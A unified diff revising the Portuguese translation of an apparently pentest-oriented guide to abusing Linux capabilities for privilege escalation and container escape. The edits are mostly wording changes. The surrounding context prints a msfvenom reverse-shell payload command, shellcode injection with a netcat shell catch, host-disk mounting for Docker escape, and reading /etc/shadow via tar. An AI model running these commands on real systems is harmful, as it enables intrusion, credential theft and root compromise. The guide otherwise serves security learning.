@@ -309,7 +309,7 @@ Portanto, um arquivo de **configuração de serviço** permite **especificar** a
 User=bob
 AmbientCapabilities=CAP_NET_BIND_SERVICE
 ```
-## Capacidades em Contêineres Docker
+## Capabilities in Docker Containers
 
 Por padrão, o Docker atribui algumas capacidades aos contêineres. É muito fácil verificar quais são essas capacidades executando:
 ```bash
@@ -328,15 +328,15 @@ docker run --rm -it  --cap-drop=ALL --cap-add=SYS_PTRACE r.j3ss.co/amicontained 
 ```
 <figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>
 
-​​​​​​​​​​[**RootedCON**](https://www.rootedcon.com/) é o evento de cibersegurança mais relevante na **Espanha** e um dos mais importantes na **Europa**. Com **a missão de promover o conhecimento técnico**, este congresso é um ponto de encontro fervilhante para profissionais de tecnologia e cibersegurança em todas as disciplinas.
+​​​​​​​​​​[**RootedCON**](https://www.rootedcon.com/) é o evento de cibersegurança mais relevante na **Espanha** e um dos mais importantes na **Europa**. Com **a missão de promover o conhecimento técnico**, este congresso é um ponto de encontro fervente para profissionais de tecnologia e cibersegurança em todas as disciplinas.
 
 {% embed url="https://www.rootedcon.com/" %}
 
 ## Privesc/Container Escape
 
-As capacidades são úteis quando você **quer restringir seus próprios processos após realizar operações privilegiadas** (por exemplo, após configurar chroot e vincular a um socket). No entanto, elas podem ser exploradas ao passar comandos ou argumentos maliciosos que são então executados como root.
+As capacidades são úteis quando você **quer restringir seus próprios processos após realizar operações privilegiadas** (por exemplo, após configurar chroot e vincular a um socket). No entanto, elas podem ser exploradas passando comandos ou argumentos maliciosos que são então executados como root.
 
-Você pode forçar capacidades em programas usando `setcap` e consultar essas usando `getcap`:
+Você pode forçar capacidades em programas usando `setcap`, e consultar essas usando `getcap`:
 ```bash
 #Set Capability
 setcap cap_net_raw+ep /sbin/ping
@@ -367,7 +367,7 @@ setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump
 getcap /usr/sbin/tcpdump
 /usr/sbin/tcpdump = cap_net_admin,cap_net_raw+eip
 ```
-### O caso especial das capacidades "vazias"
+### O caso especial de capacidades "vazias"
 
 [Dos docs](https://man7.org/linux/man-pages/man7/capabilities.7.html): Note que é possível atribuir conjuntos de capacidades vazios a um arquivo de programa, e assim é possível criar um programa set-user-ID-root que altera o set-user-ID efetivo e salvo do processo que executa o programa para 0, mas não confere capacidades a esse processo. Ou, simplificando, se você tem um binário que:
 
@@ -379,7 +379,7 @@ então **esse binário será executado como root**.
 
 ## CAP\_SYS\_ADMIN
 
-**[`CAP_SYS_ADMIN`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** é uma capacidade Linux altamente potente, frequentemente equiparada a um nível quase root devido aos seus extensos **privilegios administrativos**, como montar dispositivos ou manipular recursos do kernel. Embora seja indispensável para contêineres que simulam sistemas inteiros, **`CAP_SYS_ADMIN` apresenta desafios significativos de segurança**, especialmente em ambientes containerizados, devido ao seu potencial para escalonamento de privilégios e comprometimento do sistema. Portanto, seu uso exige avaliações de segurança rigorosas e gerenciamento cauteloso, com uma forte preferência por descartar essa capacidade em contêineres específicos de aplicativos para aderir ao **princípio do menor privilégio** e minimizar a superfície de ataque.
+**[`CAP_SYS_ADMIN`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** é uma capacidade Linux altamente potente, frequentemente equiparada a um nível quase root devido aos seus extensos **privilegios administrativos**, como montar dispositivos ou manipular recursos do kernel. Embora seja indispensável para contêineres que simulam sistemas inteiros, **`CAP_SYS_ADMIN` apresenta desafios significativos de segurança**, especialmente em ambientes conteinerizados, devido ao seu potencial para escalonamento de privilégios e comprometimento do sistema. Portanto, seu uso exige avaliações de segurança rigorosas e gerenciamento cauteloso, com uma forte preferência por descartar essa capacidade em contêineres específicos de aplicativos para aderir ao **princípio do menor privilégio** e minimizar a superfície de ataque.
 
 **Exemplo com binário**
 ```bash
@@ -440,8 +440,8 @@ chroot ./ bash #You have a shell inside the docker hosts disk
 ```
 * **Acesso total**
 
-No método anterior, conseguimos acessar o disco do host docker.\
-Caso você descubra que o host está executando um servidor **ssh**, você poderia **criar um usuário dentro do disco do host docker** e acessá-lo via SSH:
+No método anterior, conseguimos acessar o disco do host do docker.\
+Caso você descubra que o host está executando um servidor **ssh**, você poderia **criar um usuário dentro do disco do host do docker** e acessá-lo via SSH:
 ```bash
 #Like in the example before, the first step is to mount the docker host disk
 fdisk -l
@@ -559,7 +559,9 @@ libc.ptrace(PTRACE_DETACH, pid, None, None)
 ```
 /usr/bin/gdb = cap_sys_ptrace+ep
 ```
+```markdown
 Crie um shellcode com msfvenom para injetar na memória via gdb
+```
 ```python
 # msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.11 LPORT=9001 -f py -o revshell.py
 buf =  b""
@@ -642,7 +644,7 @@ Liste **processos** em execução no **host** `ps -eaf`
 2. Encontre um **shellcode** para a arquitetura ([https://www.exploit-db.com/exploits/41128](https://www.exploit-db.com/exploits/41128))
 3. Encontre um **programa** para **injetar** o **shellcode** na memória de um processo ([https://github.com/0x00pf/0x00sec\_code/blob/master/mem\_inject/infect.c](https://github.com/0x00pf/0x00sec\_code/blob/master/mem\_inject/infect.c))
 4. **Modifique** o **shellcode** dentro do programa e **compile**-o `gcc inject.c -o inject`
-5. **Injete** e capture seu **shell**: `./inject 299; nc 172.17.0.1 5600`
+5. **Injete** e pegue seu **shell**: `./inject 299; nc 172.17.0.1 5600`
 
 ## CAP\_SYS\_MODULE
 
@@ -656,7 +658,7 @@ No exemplo a seguir, o binário **`python`** possui essa capacidade.
 getcap -r / 2>/dev/null
 /usr/bin/python2.7 = cap_sys_module+ep
 ```
-Por padrão, o comando **`modprobe`** verifica a lista de dependências e arquivos de mapa no diretório **`/lib/modules/$(uname -r)`**.\
+Por padrão, o comando **`modprobe`** verifica a lista de dependências e arquivos de mapeamento no diretório **`/lib/modules/$(uname -r)`**.\
 Para abusar disso, vamos criar uma pasta falsa **lib/modules**:
 ```bash
 mkdir lib/modules -p
@@ -769,7 +771,7 @@ Outro exemplo desta técnica pode ser encontrado em [https://www.cyberark.com/re
 
 **Exemplo com binário**
 
-O binário será capaz de ler qualquer arquivo. Portanto, se um arquivo como tar tiver essa capacidade, ele poderá ler o arquivo shadow:
+O binário poderá ler qualquer arquivo. Portanto, se um arquivo como tar tiver essa capacidade, ele poderá ler o arquivo shadow:
 ```bash
 cd /etc
 tar -czf /tmp/shadow.tar.gz shadow #Compress show file in /tmp
@@ -1205,7 +1207,7 @@ os.system("/bin/bash")
 
 **Isso significa que é possível definir o id de grupo efetivo do processo criado.**
 
-Existem muitos arquivos que você pode **substituir para escalar privilégios,** [**você pode obter ideias daqui**](payloads-to-execute.md#overwriting-a-file-to-escalate-privileges).
+Existem muitos arquivos que você pode **sobrescrever para escalar privilégios,** [**você pode obter ideias daqui**](payloads-to-execute.md#overwriting-a-file-to-escalate-privileges).
 
 **Exemplo com binário**
 
@@ -1236,7 +1238,7 @@ Se o **docker** estiver instalado, você pode **impersonar** o **grupo docker** 
 
 **Exemplo com binário**
 
-Se o python tiver essa **capacidade**, você pode facilmente abusar dela para escalar privilégios para root:
+Se o python tiver essa **capacidade**, você pode muito facilmente abusar dela para escalar privilégios para root:
 
 {% code title="setcapability.py" %}
 ```python
@@ -1347,7 +1349,7 @@ kill -s SIGUSR1 <nodejs-ps>
 
 **Exemplo com binário**
 
-Se **`python`** tiver essa capacidade, ele poderá escutar em qualquer porta e até se conectar a partir dela a qualquer outra porta (alguns serviços exigem conexões de portas com privilégios específicos)
+Se **`python`** tiver essa capacidade, ele poderá escutar em qualquer porta e até se conectar a partir dela a qualquer outra porta (alguns serviços exigem conexões de portas privilegiadas específicas)
 
 {% tabs %}
 {% tab title="Listen" %}
@@ -1375,7 +1377,7 @@ s.connect(('10.10.10.10',500))
 
 ## CAP\_NET\_RAW
 
-A capacidade [**CAP\_NET\_RAW**](https://man7.org/linux/man-pages/man7/capabilities.7.html) permite que processos **criem sockets RAW e PACKET**, permitindo que gerem e enviem pacotes de rede arbitrários. Isso pode levar a riscos de segurança em ambientes containerizados, como spoofing de pacotes, injeção de tráfego e contorno de controles de acesso à rede. Atores maliciosos poderiam explorar isso para interferir no roteamento de containers ou comprometer a segurança da rede do host, especialmente sem proteções adequadas de firewall. Além disso, **CAP_NET_RAW** é crucial para containers privilegiados suportarem operações como ping via solicitações RAW ICMP.
+A capacidade [**CAP\_NET\_RAW**](https://man7.org/linux/man-pages/man7/capabilities.7.html) permite que processos **criem sockets RAW e PACKET**, possibilitando a geração e envio de pacotes de rede arbitrários. Isso pode levar a riscos de segurança em ambientes containerizados, como spoofing de pacotes, injeção de tráfego e contorno de controles de acesso à rede. Atores maliciosos poderiam explorar isso para interferir no roteamento de containers ou comprometer a segurança da rede do host, especialmente sem proteções adequadas de firewall. Além disso, **CAP_NET_RAW** é crucial para containers privilegiados suportarem operações como ping via solicitações RAW ICMP.
 
 **Isso significa que é possível monitorar o tráfego.** Você não pode escalar privilégios diretamente com essa capacidade.
 
@@ -1498,7 +1500,7 @@ sudo chattr -i file.txt
 
 ## CAP\_SYS\_BOOT
 
-[**CAP\_SYS\_BOOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html) não apenas permite a execução da chamada de sistema `reboot(2)` para reinicializações do sistema, incluindo comandos específicos como `LINUX_REBOOT_CMD_RESTART2` adaptados para certas plataformas de hardware, mas também possibilita o uso de `kexec_load(2)` e, a partir do Linux 3.17, `kexec_file_load(2)` para carregar novos ou assinados kernels de falha, respectivamente.
+[**CAP\_SYS\_BOOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html) não apenas permite a execução da chamada de sistema `reboot(2)` para reinicializações do sistema, incluindo comandos específicos como `LINUX_REBOOT_CMD_RESTART2` adaptados para certas plataformas de hardware, mas também possibilita o uso de `kexec_load(2)` e, a partir do Linux 3.17, `kexec_file_load(2)` para carregar novos ou kernels de falha assinados, respectivamente.
 
 ## CAP\_SYSLOG
 
@@ -1517,7 +1519,7 @@ Essa capacidade é essencial para processos que requerem a habilidade de criar a
 
 É uma capacidade padrão do docker ([https://github.com/moby/moby/blob/master/oci/caps/defaults.go#L6-L19](https://github.com/moby/moby/blob/master/oci/caps/defaults.go#L6-L19)).
 
-Essa capacidade permite realizar escalonamentos de privilégios (através da leitura completa do disco) no host, sob estas condições:
+Essa capacidade permite fazer escalonamentos de privilégios (através de leitura completa do disco) no host, sob estas condições:
 
 1. Ter acesso inicial ao host (sem privilégios).
 2. Ter acesso inicial ao contêiner (privilegiado (EUID 0) e efetivo `CAP_MKNOD`).
